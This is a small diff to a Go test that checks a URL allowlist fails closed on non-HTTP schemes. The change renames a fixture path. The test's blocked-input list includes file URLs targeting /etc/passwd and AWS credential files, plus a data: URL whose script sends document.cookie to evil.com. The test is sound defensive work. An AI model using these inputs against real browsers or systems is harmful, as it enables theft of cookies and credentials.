@@ -87,7 +87,7 @@ func TestAllowlistFailsClosedOnNonHTTPSchemes(t *testing.T) {
 	}
 	for _, blocked := range []string{
 		"file:///etc/passwd",
-		"FILE:///Users/x/.aws/credentials",
+		"FILE:///fixture/.aws/credentials",
 		"chrome://settings",
 		"chrome://net-export",
 		"data:text/html,<script>fetch('https://evil.com?c='+document.cookie)</script>",
